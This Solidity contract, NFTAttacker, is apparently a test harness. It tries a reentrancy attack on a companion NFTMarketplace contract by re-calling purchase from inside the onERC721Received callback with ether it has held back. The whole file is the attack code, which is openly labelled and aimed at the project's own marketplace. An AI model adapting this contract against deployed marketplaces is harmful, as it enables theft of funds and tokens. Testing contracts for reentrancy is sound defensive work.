// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTAttacker is ERC721URIStorage, IERC721Receiver {
	enum FunctionNames {
		NONE,
		PURCHASE
	}

	using Counters for Counters.Counter;
	Counters.Counter private _tokenIdCounter;
	NFTMarketplace public lmaNFTMarketplace;
	IERC721 public attackedNFT;
	uint public attackedTokenId;
	bytes32 public attackedKey;
	uint public attackerBalance;
	bytes4 public attackedFunctionSelector;
	FunctionNames public attackedFunction;
	// values to attacke the createListing function
	uint attackedPrice;
	uint attackedStartTimestamp;
	uint attackedEndTimestamp;

	constructor(
		string memory name_,
		string memory symbol_,
		address lmaNFTMartketplaceAddress
	) ERC721(name_, symbol_) {
		lmaNFTMarketplace = NFTMarketplace(lmaNFTMartketplaceAddress);
		attackedFunction = FunctionNames.NONE;
	}

	/**
	 * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
	 * by `operator` from `from`, this function is called.
	 *
	 * It must return its Solidity selector to confirm the token transfer.
	 * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
	 *
	 * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
	 */
	function onERC721Received(
		address operator,
		address from,
		uint256 tokenId,
		bytes calldata data
	) external returns (bytes4) {
		if (attackedFunction == FunctionNames.PURCHASE) {
			// Attempt to reenter purchase function
			lmaNFTMarketplace.purchase{ value: attackerBalance }(attackedNFT, attackedTokenId);
			attackedFunction = FunctionNames.NONE;
		} else {
			return this.onERC721Received.selector;
		} 
	}

	function safeMint(string memory uri, address to) public payable returns (uint256) {
		_tokenIdCounter.increment();
		uint256 tokenId = _tokenIdCounter.current();
		_mint(to, tokenId);
		_setTokenURI(tokenId, uri);
		return tokenId;
	} 

	/**
	 * @dev See {ERC721-_burn}. This override additionally checks to see if a
	 * token-specific URI was set for the token, and if so, it deletes the token URI from
	 * the storage mapping.
	 */
	function _burn(uint256 tokenId) internal override {
		super._burn(tokenId);
	} 

	// Reentrancy attack related functions
	// Attack listings
	function attackPurchase(IERC721 nft, uint256 tokenId) external payable {
		//require(msg.value >= 2 ether, "Need to send at least 2 Eth");
		// Set the function that we want to attack
		attackedNFT = nft;
		attackedTokenId = tokenId;
		attackedFunction = FunctionNames.PURCHASE;
		// Save the remainder of the value sent for the re-entrancy attack
		attackerBalance = msg.value - 2 ether;
		// Send 2 Eth to cover for the NFT price
		lmaNFTMarketplace.purchase{ value: 2 ether }(nft, tokenId);
	}

	/// @dev allow contract to receive ether
	receive() external payable {

    }
}
